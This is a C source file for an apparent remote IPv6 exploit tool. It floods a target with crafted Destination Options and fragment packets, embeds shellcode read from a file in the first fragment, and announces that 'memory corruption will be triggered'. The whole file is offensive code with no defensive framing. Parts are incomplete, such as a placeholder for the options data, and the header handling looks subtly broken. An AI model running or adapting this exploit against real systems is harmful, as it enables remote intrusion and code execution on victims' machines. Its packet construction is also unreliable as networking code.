#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip6.h>
#include <netinet/if_ether.h>
#include <netinet/ether.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <time.h>
#include <getopt.h>
#include <signal.h>
#include <errno.h>
#include <stdarg.h>

#define MAX_PACKET_SIZE 1280 // IPv6 minimum MTU
#define NUM_TRIES 20
#define NUM_BATCHES 20
#define LOG_FILE "packet_log.txt"

char iface[IFNAMSIZ] = "wlan0";  // Default interface name
char ip_addr[INET6_ADDRSTRLEN] = ""; // Default empty IPv6 address
char mac_addr[18] = ""; // Default empty MAC address
char payload[MAX_PACKET_SIZE] = {0}; // Buffer for shellcode payload
int payload_size = 0;
FILE *log_file = NULL;
int sock = -1;

void log_message(const char *format, ...) {
    va_list args;
    va_start(args, format);
    
    time_t now = time(NULL);
    char time_str[64];
    strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", localtime(&now));
    
    fprintf(log_file, "[%s] ", time_str);
    vfprintf(log_file, format, args);
    fprintf(log_file, "\n");
    fflush(log_file);
    
    va_end(args);
}

void cleanup() {
    if (log_file) {
        fclose(log_file);
    }
    if (sock != -1) {
        close(sock);
    }
}

void signal_handler(int signum) {
    printf("\nReceived signal %d. Exiting...\n", signum);
    cleanup();
    exit(signum);
}

void error(const char *msg) {
    log_message("Error: %s: %s", msg, strerror(errno));
    perror(msg);
    cleanup();
    exit(1);
}

void read_payload_from_file(const char *filename) {
    FILE *file = fopen(filename, "rb");
    if (!file) {
        error("Failed to open payload file");
    }

    payload_size = fread(payload, 1, MAX_PACKET_SIZE, file);
    if (payload_size <= 0) {
        error("Failed to read payload or payload is empty");
    }

    fclose(file);
    log_message("Payload read from file. Size: %d bytes", payload_size);
}

unsigned short checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len == 1)
        sum += *(unsigned char *)buf;
    sum = (sum & 0xffff) + (sum >> 16);
    sum = (sum & 0xffff) + (sum >> 16);
    return ~sum;
}

int get_raw_socket() {
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock == -1)
        error("Failed to create raw socket");
    return sock;
}

void set_interface_promiscuous(int sock, const char *iface) {
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);
    if (ioctl(sock, SIOCGIFFLAGS, &ifr) == -1)
        error("Failed to get interface flags");
    ifr.ifr_flags |= IFF_PROMISC;
    if (ioctl(sock, SIOCSIFFLAGS, &ifr) == -1)
        error("Failed to set promiscuous mode");
    log_message("Interface %s set to promiscuous mode", iface);
}

int get_interface_index(int sock, const char *iface) {
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) == -1)
        error("Failed to get interface index");
    return ifr.ifr_ifindex;
}

void send_packets(int sock, unsigned char *packet, int packet_len, const char *iface) {
    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_ifindex = get_interface_index(sock, iface);
    sa.sll_protocol = htons(ETH_P_IPV6);

    if (sendto(sock, packet, packet_len, 0, (struct sockaddr*)&sa, sizeof(sa)) < 0)
        error("Failed to send packet");
    log_message("Packet sent. Length: %d bytes", packet_len);
}

void craft_and_send_packets(int sock, int batch_num, int try_num) {
    struct ether_header eth_hdr;
    struct ip6_hdr ip6_hdr;
    struct ip6_frag ip6_frag;
    unsigned char packet[MAX_PACKET_SIZE];
    int packet_len;

    memset(&eth_hdr, 0, sizeof(struct ether_header));
    if (strlen(mac_addr) > 0) {
        memcpy(eth_hdr.ether_dhost, ether_aton(mac_addr), ETHER_ADDR_LEN);
        eth_hdr.ether_type = htons(ETHERTYPE_IPV6);
    }

    memset(&ip6_hdr, 0, sizeof(struct ip6_hdr));
    ip6_hdr.ip6_flow = htonl((6 << 28) | (1 << 20));
    ip6_hdr.ip6_hlim = 64 + try_num;
    inet_pton(AF_INET6, ip_addr, &(ip6_hdr.ip6_dst));
    inet_pton(AF_INET6, "::1", &(ip6_hdr.ip6_src));

    // First packet (IPv6 with Destination Options header)
    memset(packet, 0, MAX_PACKET_SIZE);
    packet_len = 0;
    if (strlen(mac_addr) > 0) {
        memcpy(packet, &eth_hdr, sizeof(struct ether_header));
        packet_len += sizeof(struct ether_header);
    }
    memcpy(packet + packet_len, &ip6_hdr, sizeof(struct ip6_hdr));
    packet_len += sizeof(struct ip6_hdr);
    // Append your custom destination options and data here
    send_packets(sock, packet, packet_len, iface);

    // Second packet (IPv6 with Fragment header, first fragment)
    memset(&ip6_frag, 0, sizeof(struct ip6_frag));
    ip6_frag.ip6f_nxt = IPPROTO_FRAGMENT;
    ip6_frag.ip6f_reserved = 0;
    ip6_frag.ip6f_offlg = htons(IP6F_MORE_FRAG);
    ip6_frag.ip6f_ident = htonl(0xdebac1e + try_num);

    memset(packet, 0, MAX_PACKET_SIZE);
    packet_len = 0;
    if (strlen(mac_addr) > 0) {
        memcpy(packet, &eth_hdr, sizeof(struct ether_header));
        packet_len += sizeof(struct ether_header);
    }
    memcpy(packet + packet_len, &ip6_hdr, sizeof(struct ip6_hdr));
    packet_len += sizeof(struct ip6_hdr);
    memcpy(packet + packet_len, &ip6_frag, sizeof(struct ip6_frag));
    packet_len += sizeof(struct ip6_frag);
    memcpy(packet + packet_len, payload, payload_size);
    packet_len += payload_size;
    send_packets(sock, packet, packet_len, iface);

    // Third packet (IPv6 with Fragment header, second fragment)
    ip6_frag.ip6f_offlg = htons(1 << 3);

    memset(packet, 0, MAX_PACKET_SIZE);
    packet_len = 0;
    if (strlen(mac_addr) > 0) {
        memcpy(packet, &eth_hdr, sizeof(struct ether_header));
        packet_len += sizeof(struct ether_header);
    }
    memcpy(packet + packet_len, &ip6_hdr, sizeof(struct ip6_hdr));
    packet_len += sizeof(struct ip6_hdr);
    memcpy(packet + packet_len, &ip6_frag, sizeof(struct ip6_frag));
    packet_len += sizeof(struct ip6_frag);
    send_packets(sock, packet, packet_len, iface);
}

int main(int argc, char *argv[]) {
    int opt;
    char config_file[256] = "";

    while ((opt = getopt(argc, argv, "i:a:m:c:h")) != -1) {
        switch (opt) {
            case 'i': strncpy(iface, optarg, IFNAMSIZ-1); break;
            case 'a': strncpy(ip_addr, optarg, INET6_ADDRSTRLEN-1); break;
            case 'm': strncpy(mac_addr, optarg, 17); break;
            case 'c': strncpy(config_file, optarg, 255); break;
            case 'h':
                printf("Usage: %s -i <interface> -a <ipv6_address> -m <mac_address> [-c <config_file>]\n", argv[0]);
                exit(0);
            default:
                fprintf(stderr, "Invalid option. Use -h for help.\n");
                exit(1);
        }
    }

    if (strlen(ip_addr) == 0 || strlen(iface) == 0) {
        fprintf(stderr, "Interface and IPv6 address are required. Use -h for help.\n");
        exit(1);
    }

    log_file = fopen(LOG_FILE, "a");
    if (!log_file) {
        fprintf(stderr, "Failed to open log file: %s\n", strerror(errno));
        exit(1);
    }

    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    log_message("Program started. Interface: %s, IPv6: %s, MAC: %s", iface, ip_addr, mac_addr);

    read_payload_from_file("shellcode.txt");

    sock = get_raw_socket();
    set_interface_promiscuous(sock, iface);

    for (int batch_num = 0; batch_num < NUM_BATCHES; batch_num++) {
        for (int try_num = 0; try_num < NUM_TRIES; try_num++) {
            craft_and_send_packets(sock, batch_num, try_num);
        }
        log_message("Batch %d/%d completed", batch_num+1, NUM_BATCHES);
    }

    printf("Sending packets\n");

    for (int i = 60; i > 0; i--) {
        printf("Memory corruption will be triggered in %d seconds\r", i);
        fflush(stdout);
        sleep(1);
    }

    printf("\n");
    log_message("Execution completed");
    cleanup();
    return 0;
}